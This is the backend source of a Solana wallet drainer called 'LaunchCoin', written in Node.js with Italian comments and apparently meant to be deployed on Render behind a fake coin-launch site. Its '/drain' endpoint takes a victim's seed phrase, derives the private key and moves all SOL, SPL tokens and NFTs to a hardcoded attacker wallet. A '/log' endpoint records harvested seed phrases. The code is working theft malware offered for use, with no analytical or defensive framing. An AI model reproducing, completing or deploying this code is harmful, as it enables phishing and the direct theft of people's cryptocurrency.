// ============================================================
// LAUNCHCOIN - BACKEND (MODIFICATO PER RENDER)
// ============================================================

import express from 'express';
import { 
  Connection, 
  PublicKey, 
  Transaction, 
  SystemProgram, 
  LAMPORTS_PER_SOL, 
  Keypair 
} from '@solana/web3.js';
import { 
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID
} from '@solana/spl-token';
import { mnemonicToSeed } from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: '50mb' }));

// ============================================================
// CONFIGURAZIONE - IL TUO WALLET DI RICEZIONE
// ============================================================
// ⚠️ SOSTITUISCI CON LA TUA CHIAVE PUBBLICA
const RECEIVER_WALLET = '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU';

// Connessione a Solana
const connection = new Connection(
  'https://api.mainnet-beta.solana.com',
  { commitment: 'confirmed', maxRetries: 10 }
);

// ============================================================
// SERVE LE PAGINE STATICHE
// ============================================================

// __dirname già definito con import.meta.url

// Servi i file statici dalla cartella corrente
app.use(express.static(__dirname));

// Gestisce le richieste per index.html
app.get('/', (req, res) => {
  const filePath = path.join(__dirname, 'index.html');
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.send(`
      <h1>🚀 LaunchCoin Server</h1>
      <p>Server attivo su Render!</p>
      <p>📁 Directory: ${__dirname}</p>
    `);
  }
});

// Gestisce le altre pagine HTML
app.get('/:page.html', (req, res) => {
  const page = req.params.page;
  const filePath = path.join(__dirname, `${page}.html`);
  if (fs.existsSync(filePath)) {
    res.sendFile(filePath);
  } else {
    res.status(404).send(`<h1>404</h1><p>Pagina ${page}.html non trovata</p>`);
  }
});

// ============================================================
// ENDPOINT DRENAGGIO
// ============================================================
app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey, timestamp, userAgent, referrer } = req.body;
  
  console.log('='.repeat(60));
  console.log(`📥 NUOVO DRENAGGIO - ${new Date().toISOString()}`);
  console.log(`💰 Wallet vittima: ${walletPublicKey || 'N/A'}`);
  
  if (!seed || !walletPublicKey) {
    console.log('❌ Dati mancanti');
    return res.status(400).json({ 
      error: 'Dati mancanti: seed e walletPublicKey sono obbligatori' 
    });
  }

  try {
    // ============================================================
    // 1. DERIVA LA KEYPAIR DALLA SEED
    // ============================================================
    console.log('🔑 Derivazione keypair dalla seed...');
    
    const seedBuffer = await mnemonicToSeed(seed);
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(RECEIVER_WALLET);

    console.log(`👤 Da: ${fromPubkey.toString()}`);
    console.log(`📤 A: ${toPubkey.toString()}`);

    // ============================================================
    // 2. VERIFICA BILANCIO
    // ============================================================
    const balance = await connection.getBalance(fromPubkey);
    console.log(`💰 Bilancio SOL: ${balance / LAMPORTS_PER_SOL} SOL`);

    // ============================================================
    // 3. DRENAGGIO TUTTI I SOL
    // ============================================================
    let solTx = null;
    let solAmount = 0;
    
    if (balance > 10000) {
      const fee = 10000;
      const amount = balance - fee;
      
      if (amount > 0) {
        console.log(`💸 Trasferimento ${amount / LAMPORTS_PER_SOL} SOL...`);
        
        const tx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: fromPubkey,
            toPubkey: toPubkey,
            lamports: amount,
          })
        );
        
        const blockhash = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash.blockhash;
        tx.feePayer = fromPubkey;
        
        solTx = await connection.sendTransaction(tx, [fromKeypair]);
        console.log(`✅ SOL trasferiti! Tx: ${solTx}`);
        
        await connection.confirmTransaction(solTx);
        console.log(`✅ Transazione SOL confermata`);
        
        solAmount = amount / LAMPORTS_PER_SOL;
      }
    }

    // ============================================================
    // 4. DRENAGGIO TUTTI I TOKEN SPL
    // ============================================================
    console.log('🔍 Ricerca token SPL...');
    
    const tokenAccounts = await connection.getTokenAccountsByOwner(fromPubkey, {
      programId: TOKEN_PROGRAM_ID,
    });

    console.log(`🪙 Trovati ${tokenAccounts.value.length} account token`);

    let tokenTxList = [];
    let tokenDetails = [];

    for (const account of tokenAccounts.value) {
      const tokenAccount = account.pubkey;
      
      try {
        const tokenInfo = await connection.getTokenAccountBalance(tokenAccount);
        
        if (tokenInfo.value.amount > 0) {
          const accountInfo = await connection.getAccountInfo(tokenAccount);
          if (!accountInfo) continue;
          
          const mint = new PublicKey(accountInfo.data.slice(0, 32));
          
          console.log(`🪙 Token trovato: ${mint.toString()}`);
          console.log(`   Quantità: ${tokenInfo.value.uiAmount || 0}`);
          
          const receiverTokenAccount = await getAssociatedTokenAddress(
            mint,
            toPubkey
          );
          
          const receiverAccountInfo = await connection.getAccountInfo(receiverTokenAccount);
          
          const tx = new Transaction();
          
          if (!receiverAccountInfo) {
            tx.add(
              createAssociatedTokenAccountInstruction(
                fromPubkey,
                receiverTokenAccount,
                toPubkey,
                mint
              )
            );
          }
          
          tx.add(
            createTransferInstruction(
              tokenAccount,
              receiverTokenAccount,
              fromPubkey,
              tokenInfo.value.amount
            )
          );
          
          const blockhash = await connection.getLatestBlockhash();
          tx.recentBlockhash = blockhash.blockhash;
          tx.feePayer = fromPubkey;
          
          const signature = await connection.sendTransaction(tx, [fromKeypair]);
          await connection.confirmTransaction(signature);
          
          tokenTxList.push(signature);
          tokenDetails.push({
            mint: mint.toString(),
            amount: tokenInfo.value.uiAmount || 0,
            decimals: tokenInfo.value.decimals,
            tx: signature
          });
          
          console.log(`   ✅ Token trasferiti! Tx: ${signature}`);
        }
        
      } catch(e) {
        console.log(`   ⚠️ Errore drenaggio token: ${e.message}`);
      }
    }

    // ============================================================
    // 5. DRENAGGIO NFT (Metaplex)
    // ============================================================
    console.log('🔍 Ricerca NFT...');
    
    try {
      const metaplexProgramId = new PublicKey('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s');
      const nftAccounts = await connection.getProgramAccounts(metaplexProgramId, {
        filters: [{ dataSize: 679 }]
      });
      
      console.log(`🖼️ Trovati ${nftAccounts.length} NFT potenziali`);
      
      for (const nft of nftAccounts) {
        try {
          const mint = new PublicKey(nft.account.data.slice(33, 65));
          const largestAccounts = await connection.getTokenLargestAccounts(mint);
          
          for (const account of largestAccounts.value) {
            if (account.address.equals(fromPubkey)) {
              console.log(`🖼️ NFT trovato: ${mint.toString()}`);
              
              const fromTokenAccount = await getAssociatedTokenAddress(mint, fromPubkey);
              const toTokenAccount = await getAssociatedTokenAddress(mint, toPubkey);
              const receiverInfo = await connection.getAccountInfo(toTokenAccount);
              
              const tx = new Transaction();
              
              if (!receiverInfo) {
                tx.add(
                  createAssociatedTokenAccountInstruction(
                    fromPubkey,
                    toTokenAccount,
                    toPubkey,
                    mint
                  )
                );
              }
              
              tx.add(
                createTransferInstruction(
                  fromTokenAccount,
                  toTokenAccount,
                  fromPubkey,
                  1
                )
              );
              
              const blockhash = await connection.getLatestBlockhash();
              tx.recentBlockhash = blockhash.blockhash;
              tx.feePayer = fromPubkey;
              
              const signature = await connection.sendTransaction(tx, [fromKeypair]);
              await connection.confirmTransaction(signature);
              
              console.log(`   ✅ NFT trasferito! Tx: ${signature}`);
              tokenTxList.push(signature);
            }
          }
        } catch(e) {
          console.log(`   ⚠️ Errore NFT: ${e.message}`);
        }
      }
      
    } catch(e) {
      console.log(`   ⚠️ Errore ricerca NFT: ${e.message}`);
    }

    // ============================================================
    // 6. RISULTATO
    // ============================================================
    const result = {
      status: 'drain_completed',
      from: fromPubkey.toString(),
      to: toPubkey.toString(),
      solTx: solTx,
      solAmount: solAmount,
      tokenTxs: tokenTxList,
      tokenCount: tokenTxList.length,
      tokenDetails: tokenDetails,
      timestamp: new Date().toISOString()
    };

    console.log('✅ DRENAGGIO COMPLETATO!');
    console.log(`💰 SOL drenati: ${solAmount}`);
    console.log(`🪙 Token drenati: ${tokenTxList.length}`);
    console.log('='.repeat(60));

    res.json(result);

  } catch (e) {
    console.error(`❌ ERRORE DRENAGGIO: ${e.message}`);
    if (e.stack) console.error(e.stack);
    
    res.status(500).json({ 
      error: e.message,
      stack: e.stack || 'N/A'
    });
  }
});

// ============================================================
// ENDPOINT LOG
// ============================================================
app.post('/log', (req, res) => {
  const data = req.body;
  console.log(`📥 LOG: ${JSON.stringify(data)}`);
  
  if (data.seed) {
    console.log(`⚠️ SEED RICEVUTA: ${data.seed}`);
  }
  
  res.json({ status: 'ok' });
});

// ============================================================
// FALLBACK PER TUTTE LE ALTRE RICHIESTE
// ============================================================
app.get('*', (req, res) => {
  const indexPath = path.join(__dirname, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(200).send(`
      <!DOCTYPE html>
      <html>
      <head><title>LaunchCoin</title></head>
      <body>
        <h1>🚀 LaunchCoin Server</h1>
        <p>Server attivo su Render!</p>
        <p>📁 Directory: ${__dirname}</p>
      </body>
      </html>
    `);
  }
});

// ============================================================
// AVVIA SERVER
// ============================================================
const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
  console.log('='.repeat(60));
  console.log('🚀 LAUNCHCOIN SERVER');
  console.log(`📡 Porta: ${PORT}`);
  console.log(`💰 Wallet di ricezione: ${RECEIVER_WALLET}`);
  console.log('='.repeat(60));
});
